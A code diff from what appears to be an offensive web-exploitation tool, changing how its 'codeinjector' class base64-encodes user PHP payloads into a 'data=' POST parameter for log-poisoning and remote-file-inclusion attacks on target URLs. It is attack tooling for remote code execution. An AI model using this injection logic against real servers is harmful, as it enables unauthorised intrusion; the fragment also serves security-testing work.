@@ -143,6 +143,7 @@ class codeinjector(baseClass):
                         code = self.executeRFI(url, postdata, suffix, testload)
                     elif (mode.find("L") != -1):
                         testload = self.convertUserloadToLogInjection(testload)
+                        testload = "data=" + base64.b64encode(testload)
                         if (postdata != ""):
                             testload = "%s&%s" %(postdata, testload)
                         code = self.doPostRequest(url, testload)
@@ -277,8 +278,8 @@ class codeinjector(baseClass):
         elif (m.find("L") != -1):
             if (not self.isLogKickstarterPresent):
                 self._log("Testing if log kickstarter is present...", self.LOG_INFO)
-                testcode = self.getPHPQuiz()
-                p = "data=" + base64.b64encode(testcode[0])
+                testcode = langClass.generateQuiz()
+                p = "data=" + base64.b64encode(self.convertUserloadToLogInjection(testcode[0]))
                 if (postdata != ""):
                     p = "%s&%s" %(postdata, p)
                 code = self.doPostRequest(url, p)
@@ -297,7 +298,7 @@ class codeinjector(baseClass):
                     
                     self._log("Testing once again if kickstarter is present...", self.LOG_INFO)
                     testcode = langClass.generateQuiz()
-                    p = "data=" + base64.b64encode(testcode[0])
+                    p = "data=" + base64.b64encode(self.convertUserloadToLogInjection(testcode[0]))
                     if (postdata != ""):
                         p = "%s&%s" %(postdata, p)
                     code = self.doPostRequest(url, p)
@@ -315,6 +316,7 @@ class codeinjector(baseClass):
             if (self.isLogKickstarterPresent):
                 # Remove all <? and ?> tags.
                 userload = self.convertUserloadToLogInjection(userload)
+                userload = "data=" + base64.b64encode(userload)
                 if (postdata != ""):
                     userload = "%s&%s" %(postdata, userload)
                 code = self.doPostRequest(url, userload)
@@ -377,8 +379,7 @@ class codeinjector(baseClass):
     def convertUserloadToLogInjection(self, userload):
         userload = userload.replace("<?php", "").replace("?>", "")
         userload = userload.replace("<?", "")
-        userload = "data=" + base64.b64encode(userload).replace("+", "%2B").replace("=", "%3D")
-        return(userload)
+        return(userload.strip())
 
 
     def chooseAttackMode(self, language, php=True, syst=True):
